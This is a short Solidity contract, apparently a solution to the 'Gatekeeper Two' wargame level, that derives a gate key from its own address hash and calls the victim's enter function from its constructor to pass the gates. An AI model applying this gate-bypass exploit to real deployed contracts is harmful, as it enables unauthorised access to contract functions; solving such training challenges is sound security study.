pragma solidity 0.8.7;


contract GatekeeperTwoHack {

  constructor(address _victimAddress) {  
      bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
      (bool success, bytes memory result) = _victimAddress.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
      require(success,"Attack is not successful");
  }


}